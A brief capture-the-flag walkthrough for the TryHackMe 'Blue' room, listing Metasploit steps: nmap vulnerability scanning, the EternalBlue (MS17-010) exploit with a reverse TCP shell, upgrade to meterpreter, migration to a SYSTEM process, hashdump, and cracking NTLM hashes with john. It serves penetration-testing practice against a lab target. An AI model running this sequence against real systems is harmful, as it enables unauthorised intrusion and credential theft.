[Blue Room Link](https://tryhackme.com/room/blue)

We're going to be using Metasploit for this CTF.

RECON:
1. `nmap -sV -vv --script vuln TARGET_IP`
2. Discover 3 open ports, 2 vulnerabilities `MS17-010` `MS12-020`
GAIN:
3. Launch metasploit
4. `search ms17-010` classic eternalblue SMB exploit
5. `show options` and set them for `RHOSTS`
6. `set payload windows/x64/shell/reverse_tcp` 
7. `run`
ESCALATE:
8. Research online how to convert a shell to meterpreter shell in metasploit.
9. We're going have to use a **post exploitation module**
10. We're going to be using `shell_to_meterpreter` module
11. `show options` set for `LHOST` and `SESSION`
12. `run` the post exploit, it should create a new session for us
13. `sessions -i ID` and then run `getsystem` to confirm if we escalated
14. another way to confirm is run `shell` then `whoami` and it should say system
15. background with `CTRL + Z` once confirmed
16. now, show the running processes by `ps` then locate bottom process that runs at `NT AUTHORITY\SYSTEM` and note down the PID
17. `migrate <PID>` to that process. (unstable and may fail a few times)
CRACK:
18. `hashdump` once migrated to get the non-default user's password.
19. `john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt` make sure you stored the NTLM password hash in a file, this should crack it
Find Flags!
20. Flag1 can be found if you navigate to `C:/` and `ls`
21. Flag2 was hinted to be where 'windows password stored' so it's `c:\Windows\System32\config\` but not `SAM` file as you can't cd to that
22. Flag3 was stored in documents, I found it by simply `search -f flag3.txt` but it was hinted to be in admin's documents `c:\Users\Jon\Documents\flag3.txt`
